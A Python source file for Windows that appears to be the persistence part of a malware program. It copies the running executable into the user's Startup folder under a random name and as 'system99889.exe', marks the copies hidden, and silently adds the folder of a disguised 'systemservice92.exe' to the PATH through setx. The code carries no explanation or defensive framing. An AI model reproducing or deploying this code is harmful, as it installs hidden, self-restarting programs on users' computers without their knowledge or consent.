import os, sys, subprocess,shutil,win32file,random,string
def pathadd():
    if sys.platform == 'win32' and os.path.basename(sys.executable).lower() == 'systemservice92.exe':
        exe_dir = os.path.dirname(sys.executable)
        os.environ['PATH'] = exe_dir + os.pathsep + os.environ.get('PATH', '')
        subprocess.run(["setx", "PATH", os.environ['PATH']], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
def random_filename(length=16):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + '.exe'

def starttup():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    random_name = random_filename()
    target_exe = os.path.join(startup_folder, random_name)
    
    if not os.path.exists(target_exe):
        shutil.copy2(sys.executable, target_exe)
        win32file.SetFileAttributes(target_exe, win32file.FILE_ATTRIBUTE_HIDDEN)      
def ss():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    target_exe = os.path.join(startup_folder, "system99889.exe")
    
    if not os.path.exists(target_exe):
        shutil.copy2(sys.executable, target_exe)
        win32file.SetFileAttributes(target_exe, win32file.FILE_ATTRIBUTE_HIDDEN)         